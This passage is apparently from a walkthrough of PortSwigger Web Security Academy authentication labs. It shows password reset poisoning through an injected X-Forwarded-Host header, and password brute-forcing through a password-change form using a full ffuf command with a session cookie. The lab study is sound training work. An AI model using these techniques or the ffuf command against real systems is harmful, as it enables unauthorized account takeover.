![[images/walkthrough/PortSwigger/Authentication/lab10/9.png]]

- Enter the password and delete the account.

![[images/walkthrough/PortSwigger/Authentication/lab10/solved.png]]

Solved!
## 11. Password reset poisoning via middleware

>[!done]

>[!note]+ Lab description
> - [Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
> - Level: #Practitioner 
> 
> This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

### Solution

- First, log in to see how the functionality works:

![[images/walkthrough/PortSwigger/Authentication/lab11/1.png]]

- Log out and test the `Forgot password?` functionality:

![[images/walkthrough/PortSwigger/Authentication/lab11/2.png]]

- In the email field, enter `wiener` or the email from the account:

![[images/walkthrough/PortSwigger/Authentication/lab11/3.png]]

- In `Exploit server` -> `Email client`, click the password reset link in the email you receive:

![[images/walkthrough/PortSwigger/Authentication/lab11/4.png]]

- Then change password:

![[images/walkthrough/PortSwigger/Authentication/lab11/5.png]]

- The complete flow looks like this:

![[images/walkthrough/PortSwigger/Authentication/lab11/6.png]]

- Notice the token repeats in the URL parameters (what does it even do there?) and body parameters.
- But is there a way to redirect `carlos`'s emails somehow?
- You notice that `X-Forwarded-Host` header is supported. Send a `POST` request to `/forgot-password` to repeater, add the header with your exploit server domain, and change username to `carlos`: 

![[images/walkthrough/PortSwigger/Authentication/lab11/7.png]]

- In the access log, you see:

![[images/walkthrough/PortSwigger/Authentication/lab11/8.png]]

- Copy this path and paste it to the search bar after the domain name:
![[images/walkthrough/PortSwigger/Authentication/lab11/9.png]]

- Then reset the password:

![[images/walkthrough/PortSwigger/Authentication/lab11/10.png]]

- After that, you can login as `carlos` with the password you set:

![[images/walkthrough/PortSwigger/Authentication/lab11/solved.png]]


Solved!


explain how it works
## 12. Password brute-force via password change

>[!done]

>[!note]+ Lab description
> - [`Lab: Password brute-force via password change`](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
> - Level: #Practitioner 
>
> This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
> 
> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

### Solution

- First, log in with the provided credentials to learn how this functionality works. Upon log in, you'll see a password change form:

![[images/walkthrough/PortSwigger/Authentication/12/1.png]]

- Change password to see how it works.

![[images/walkthrough/PortSwigger/Authentication/12/2.png]]

- In Burp, it looks like this:

![[images/walkthrough/PortSwigger/Authentication/12/3.png]]

- If you enter an invalid old password, you're immediately logged out and redirected to `/login` page:

![[images/walkthrough/PortSwigger/Authentication/12/4.png]]

- If you enter two incorrect passwords (incorrect current and not matching new), you won't be redirected, but simply see a message `Currect password is incorrect`:

![[images/walkthrough/PortSwigger/Authentication/12/5.png]]

- If you send the request to repeater and change username to `carlos`, leaving the session cookie as it was, the application won't notice:

![[images/walkthrough/PortSwigger/Authentication/12/6.png]]

- This can be exploited for password brute-force. Copy that request as `curl` command and transform it to `ffuf`:

```bash
ffuf -u 'https://0ae500fa048998d980c59938006a00ef.web-security-academy.net/my-account/change-password' \
	-X POST -w passwords.txt \
	-d 'username=carlos&current-password=FUZZ&new-password-1=peter3&new-password-2=peter4' \
	-H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36' \
	-b 'session=Lzvfk0XLEksUu4PRvx4kdvTpXrIiEquv'
```

- One of the responses is slightly different in length:

![[images/walkthrough/PortSwigger/Authentication/12/7.png]]

- Use this password to log in as `carlos`:

![[images/walkthrough/PortSwigger/Authentication/12/solved.png]]

Solved!